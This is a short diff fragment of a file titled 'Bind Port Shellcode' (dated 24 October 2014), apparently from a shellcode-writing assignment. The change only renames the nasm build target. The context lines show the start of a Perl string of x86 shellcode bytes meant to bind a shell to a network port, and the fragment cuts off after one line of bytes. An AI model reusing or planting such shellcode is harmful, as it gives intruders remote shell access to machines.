@@ -2,7 +2,7 @@
 ; 24 October 2014
 ; Bind Port Shellcode
 ;
-; nasm -f bin assn2.asm
+; nasm -f bin bindport-shellcode.asm
 /*
 my $shellcode =
 "\x31\xdb\x53\x6a\x01\x6a\x02\x89\xe1\x43\xb8\x66\x00\x00\x00" . 
